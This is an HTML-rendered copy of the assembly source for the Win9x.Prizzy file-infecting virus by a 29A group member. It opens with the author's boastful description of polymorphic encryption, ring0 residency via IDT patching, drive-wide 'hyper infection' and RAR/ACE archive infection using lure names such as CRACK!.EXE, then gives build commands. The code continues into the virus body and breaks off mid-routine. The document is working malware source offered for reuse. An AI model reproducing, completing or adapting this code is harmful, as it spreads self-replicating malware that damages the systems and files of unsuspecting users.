<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>prizzy.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  ÚÄÄÍÍÍÍÍÍÍÍÄÄÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿ÄÄÍÍÍÍÍÍÍÍÄÄ¿</span><span class="sc0">
</span><span class="sc1">;  : Prizzy/29A :        Win9x.Prizzy             : Prizzy/29A :</span><span class="sc0">
</span><span class="sc1">;  ÀÄÄÍÍÍÍÍÍÍÍÄÄÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙÄÄÍÍÍÍÍÍÍÍÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;             made in the Czech Republic</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   I am very proud on  my very first virus  at Windows 95/98  platform. It</span><span class="sc0">
</span><span class="sc1">;   infects EXE files in a format of PE (Portable Executable) for operation</span><span class="sc0">
</span><span class="sc1">;   system Windows 95/98. And also Win9x.Prizzy is a virus-worm for RAR/ACE</span><span class="sc0">
</span><span class="sc1">;   archives - how cleanly  RAR/ACE  so it infects  in a format of SFX-EXE.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   When infected PE file  is started,  the virus  receives  management and</span><span class="sc0">
</span><span class="sc1">;   polymorphic decoder (Prizzy Polymorphic Engine - PPE) decipher the base</span><span class="sc0">
</span><span class="sc1">;   code of a virus. This PPE can generate a lot of garbages and for decod-</span><span class="sc0">
</span><span class="sc1">;   ing uses MMX  and  Coprocessor instructions like next registers of CPU.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   When the PPE finished, the virus calls the routine  to get the original</span><span class="sc0">
</span><span class="sc1">;   base address  of KERNEL32.DLL. Then  virus searches for GetProcAddressA</span><span class="sc0">
</span><span class="sc1">;   in  the import  table. This API function  it uses  to get GetDriveTypeA</span><span class="sc0">
</span><span class="sc1">;   address - which Win9x.Prizzy uses by hyper-infection (see below).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   To resident, it  patches the IDT, it  isn't protected in Windows 95/98,</span><span class="sc0">
</span><span class="sc1">;   modifies  the INT 3 vector to  point code into  the virus,  and execute</span><span class="sc0">
</span><span class="sc1">;   this  interrupt. As  the code is  executed  in ring0,  the virus  alloc</span><span class="sc0">
</span><span class="sc1">;   memory (IFSMgr_GetMem) and  hooks (IFSMgr_InstallFileSystemApiHook) for</span><span class="sc0">
</span><span class="sc1">;   works with files. Because  the author discovered IFS errors, Prizzy can</span><span class="sc0">
</span><span class="sc1">;   hooks only opened files (read more below).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;            New technics in the VX scene</span><span class="sc0">
</span><span class="sc1">;           ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Prizzy Polymorphic Engine (PPE)</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   I'm very proud on my very good polymorphic engine because  as the first</span><span class="sc0">
</span><span class="sc1">;   virus it  can generate  decoding decoding loop  in  MMX and Coprocessor</span><span class="sc0">
</span><span class="sc1">;   instructions. I would like to remind decoder couldn't  supports MMX and</span><span class="sc0">
</span><span class="sc1">;   copro instructions  at one bout  (because MMX has been built on copro).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   What instructions I can generate:</span><span class="sc0">
</span><span class="sc1">;   * 149 type of base-instructions (37 from GriYo/29A, thanks)</span><span class="sc0">
</span><span class="sc1">;   * 43  type of copro-instructions</span><span class="sc0">
</span><span class="sc1">;   * 46  type of MMX-instructions</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   But no every computer, where is Windows 95/98,  do not need be CPU with</span><span class="sc0">
</span><span class="sc1">;   MMX technology. So, I use CPUID instruction to get result. But this in-</span><span class="sc0">
</span><span class="sc1">;   struction CPU supports on 486+, if it isn't  supports  the PPE use only</span><span class="sc0">
</span><span class="sc1">;   coprocessor.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   I  can  generate  some  more  difficult garbage,  as  are  instructions</span><span class="sc0">
</span><span class="sc1">;   CMPS/LODS/STOS/SCAS/MOVS (and set their regz), CALL/JMP reg32, or iluzo</span><span class="sc0">
</span><span class="sc1">;   return  (find "g_iluzo_return:" for more infoz - this  garbage simulate</span><span class="sc0">
</span><span class="sc1">;   the end of decoding - jump to  non-decoded  virus body), or the garbage</span><span class="sc0">
</span><span class="sc1">;   which  simulate  decoding compare (find "g_compare:" for  more  infoz).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Some beastly doing functions are termed as "sado-maso function" as are:</span><span class="sc0">
</span><span class="sc1">;   * reg + garbage + dec reg + jnz reg</span><span class="sc0">
</span><span class="sc1">;   * encryption a destination value</span><span class="sc0">
</span><span class="sc1">;   * putting CPUID and MMX test to poly-decode loop</span><span class="sc0">
</span><span class="sc1">;   and so on...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   For many infoz find "ppe_startup:" and "__no_flags_1:" in this file.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Hyper infection</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   By this function Win9x.Prizzy can  infect  all files  on disks  at very</span><span class="sc0">
</span><span class="sc1">;   little time. To Prizzy gots type of drive (if it isn't CD-ROM, RAM-DISK</span><span class="sc0">
</span><span class="sc1">;   NETWORK, FLOPPY...) must it uses GetDriveTypeA API function. Then every</span><span class="sc0">
</span><span class="sc1">;   three  second is  active "init_search:" which  scans  all EXE  files on</span><span class="sc0">
</span><span class="sc1">;   disks and  then Prizzy infect them. But  Prizzy must give time to other</span><span class="sc0">
</span><span class="sc1">;   Windows application, infection NEVER takes more then one second. Do you</span><span class="sc0">
</span><span class="sc1">;   think it's little ? No, it isn't, I did  some tests :). This  code  was</span><span class="sc0">
</span><span class="sc1">;   designed to it could serves in other viruses which you will write.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Infection ACE/RAR and ACE/RAR EXE-SFX (DOS, Win 95/98) archivez</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;   I am  very glad Win9x.Prizzy is  the first virus  which infects ACE/RAR</span><span class="sc0">
</span><span class="sc1">;   archives as  cleanly ACE/RAR format so  RAR-SFX/ACE-SFX (German/English</span><span class="sc0">
</span><span class="sc1">;   version). And because in EXE-PE can be saved comment and many infoz, my</span><span class="sc0">
</span><span class="sc1">;   RAR/ACE infector searches a piece of code to find the archive's header.</span><span class="sc0">
</span><span class="sc1">;   Then it  checks  VolumeNumber value if it isn't C00 (ACE) or R00 (RAR),</span><span class="sc0">
</span><span class="sc1">;   it checks TimeDate  if is divided by 85,  if not,  Prizzy writes on the</span><span class="sc0">
</span><span class="sc1">;   end of  archive any  infected file  (which it  is infected and with the</span><span class="sc0">
</span><span class="sc1">;   smallest size),  add new FileHeader and  calculate CRC32 for header and</span><span class="sc0">
</span><span class="sc1">;   for reserved file-dropper. Dropper's name is selected from these titles</span><span class="sc0">
</span><span class="sc1">;   INSTALL, SETUP, RUN, SOUND, CONFIG, HELP, GRATIS, CRACK and README.  To</span><span class="sc0">
</span><span class="sc1">;   that  generated title is add + EXE and  to last of  the  3rd titles can</span><span class="sc0">
</span><span class="sc1">;   generate '!' char as is (!GRATIS.EXE or CRACK!.EXE etc.).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                  Greetings</span><span class="sc0">
</span><span class="sc1">;                 ÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   And finnaly the greatings go to:</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;     GriYo/29A ........ I understood principle of poly-tables thank you :)</span><span class="sc0">
</span><span class="sc1">;     Darkman/29A ...... thx for contact 29A, correct my english, thanks</span><span class="sc0">
</span><span class="sc1">;     Z0mbie/29A ....... for IDT orientation - btw, he never answered me :)</span><span class="sc0">
</span><span class="sc1">;     Sexy/29A ......... your Sexy has too bugs, I'd to do anti-sexy, know y?</span><span class="sc0">
</span><span class="sc1">;     Lucciana, Melon .. thanks for correct my spanish learning by you</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;   Compiling it</span><span class="sc0">
</span><span class="sc1">;   ÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc1">;     tasm32 -ml -m5 -q -zn prizzy.asm</span><span class="sc0">
</span><span class="sc1">;     tlink32 -Tpe -c -x -aa prizzy,,, import32</span><span class="sc0">
</span><span class="sc1">;     pewrsec prizzy.exe</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc2">.386p</span><span class="sc0">
        </span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">STDCALL</span><span class="sc0">

        </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc9">Include</span><span class="sc0">\</span><span class="sc5">MZ.inc</span><span class="sc0">
        </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc9">Include</span><span class="sc0">\</span><span class="sc5">PE.inc</span><span class="sc0">
        </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc9">Include</span><span class="sc0">\</span><span class="sc5">Win32API.inc</span><span class="sc0">
        </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc9">Include</span><span class="sc0">\</span><span class="sc5">Hiew_VMM.inc</span><span class="sc0">
        </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc9">Include</span><span class="sc0">\</span><span class="sc5">Useful.inc</span><span class="sc0">

        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">MessageBoxA</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ some equ's needed by virus ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc1">;DEBUG       equ     YEZ             ;only for debug and 1st start</span><span class="sc0">
</span><span class="sc5">mem_size</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">mem_end</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">;size of virus in memory</span><span class="sc0">
</span><span class="sc5">file_size</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">file_end</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">  </span><span class="sc1">;size of virus in file</span><span class="sc0">

</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
</span><span class="sc5">infect_minsize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4096</span><span class="sc0">            </span><span class="sc1">;my test-PE file has 4096b</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
</span><span class="sc5">infect_minsize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">16384</span><span class="sc0">           </span><span class="sc1">;only filez bigger then 16K</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
</span><span class="sc5">infect_maxsize</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">       </span><span class="sc1">;to 100Mb</span><span class="sc0">

</span><span class="sc5">access_ebx</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;access into stack when</span><span class="sc0">
</span><span class="sc5">access_edx</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;will be use pushad</span><span class="sc0">
</span><span class="sc5">access_ecx</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">access_eax</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">search_mem_size</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">100</span><span class="sc4">*(</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">dta</span><span class="sc4">+</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">search_address</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ some structurez for virus ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">ifs_onstack</span><span class="sc0">     </span><span class="sc9">struc</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;saved ebp</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;return address</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;the address of the FSD function that is to be called for this API</span><span class="sc0">
</span><span class="sc5">_function</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;the function that is being performed</span><span class="sc0">
</span><span class="sc5">_drive</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;the 1-based drive the operation is being performed on (-1 if UNC)</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;the kind of resource the operation is being performed on</span><span class="sc0">
</span><span class="sc5">_codepage</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;the codepage that the user string was passeed in on</span><span class="sc0">
</span><span class="sc5">_ioreq_ptr</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">;pointer to IOREQ structure</span><span class="sc0">
            </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc5">dta_struc</span><span class="sc0">       </span><span class="sc9">struc</span><span class="sc0">           </span><span class="sc1">;dta struc for FindFile</span><span class="sc0">
</span><span class="sc5">dta_fileattr</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dta_time_creation</span><span class="sc0">   </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dta_time_lastaccess</span><span class="sc0"> </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dta_time_lastwrite</span><span class="sc0">  </span><span class="sc9">dq</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dta_filesize_hi</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dta_filesize</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dta_reserved_0</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dta_reserved_1</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">dta_filename</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">dta_filename_short</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">14</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc9">ends</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ some equ's from IFS.INC ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">R0_OPENCREATFILE</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0D500h</span><span class="sc0">      </span><span class="sc1">;Open/Create a file</span><span class="sc0">
</span><span class="sc5">R0_READFILE</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0D600h</span><span class="sc0">      </span><span class="sc1">;Read a file, no context</span><span class="sc0">
</span><span class="sc5">R0_WRITEFILE</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0D601h</span><span class="sc0">      </span><span class="sc1">;Write to a file</span><span class="sc0">
</span><span class="sc5">R0_CLOSEFILE</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0D700h</span><span class="sc0">      </span><span class="sc1">;Close a file</span><span class="sc0">
</span><span class="sc5">R0_GETFILESIZE</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0D800h</span><span class="sc0">      </span><span class="sc1">;Get size of a file</span><span class="sc0">
</span><span class="sc5">R0_FINDFIRSTFILE</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">04E00h</span><span class="sc0">      </span><span class="sc1">;Do a LFN FindFirst operation</span><span class="sc0">
</span><span class="sc5">R0_FINDNEXTFILE</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">04F00h</span><span class="sc0">      </span><span class="sc1">;Do a LFN FindNext operation</span><span class="sc0">
</span><span class="sc5">R0_FINDCLOSEFILE</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0DC00h</span><span class="sc0">      </span><span class="sc1">;Do a LFN FindClose operation</span><span class="sc0">
</span><span class="sc5">R0_FILEATTRIBUTES</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">04300h</span><span class="sc0">      </span><span class="sc1">;Get/Set Attributes of a file</span><span class="sc0">
</span><span class="sc5">GET_ATTRIBUTES</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">SET_ATTRIBUTES</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">

</span><span class="sc5">IFSFN_OPEN</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">36</span><span class="sc0">
</span><span class="sc5">IFSFN_RENAME</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">37</span><span class="sc0">      </span><span class="sc1">;this ain't use here 'cause</span><span class="sc0">
</span><span class="sc5">IFSFN_FILEATTRIB</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">33</span><span class="sc0">      </span><span class="sc1">;they has got bad values !!</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ some useful macroz ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc5">get_base</span><span class="sc0">        </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">reg</span><span class="sc0">     </span><span class="sc1">;get address where we're</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc5">reg</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc5">reg</span><span class="sc4">,</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc0">
            </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">VxDCall</span><span class="sc0">         </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">service</span><span class="sc0">     </span><span class="sc1">;standard VxD call rutinue</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0CDh</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">020h</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">service</span><span class="sc0">
            </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc5">VMMCall</span><span class="sc0">         </span><span class="sc9">macro</span><span class="sc0">   </span><span class="sc5">service</span><span class="sc0">     </span><span class="sc1">;VxD call like VMM</span><span class="sc0">
            </span><span class="sc5">VxDCall</span><span class="sc0"> </span><span class="sc5">VMM_</span><span class="sc4">&amp;</span><span class="sc5">service</span><span class="sc4">&amp;</span><span class="sc0">
            </span><span class="sc9">endm</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ prepare to virus start ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">

</span><span class="sc9">.data</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">

</span><span class="sc1">;ÄÄÄ´ virus code starts here ÃÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ</span><span class="sc0">
</span><span class="sc5">virus_start</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">get_base</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">            </span><span class="sc1">;get entry point to ebp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">2Dh</span><span class="sc0">         </span><span class="sc1">;sub eax,infected_ep</span><span class="sc0">
</span><span class="sc5">infected_ep</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">05h</span><span class="sc0">         </span><span class="sc1">;add eax,original_ep</span><span class="sc0">
</span><span class="sc5">original_ep</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">00000000</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc5">.byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc4">,</span><span class="sc2">0BFh</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">jump_host</span><span class="sc0">       </span><span class="sc1">;jump if WinNT</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">find_kernel32</span><span class="sc0">       </span><span class="sc1">;find kernel's base address</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_disks</span><span class="sc0">       </span><span class="sc1">;search fixed, cd-rom, etc</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">my_idt</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;save</span><span class="sc0">
        </span><span class="sc6">sidt</span><span class="sc0">    </span><span class="sc10">fword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;Interrupt Descriptor Table</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">;(IDT) to EDI</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc0">         </span><span class="sc1">;it'll be int #3</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;save int #3 IDT</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_idt</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_idt</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">-</span><span class="sc5">virus_start</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">scasw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0EEh</span><span class="sc0">         </span><span class="sc1">;flags of descriptor</span><span class="sc0">
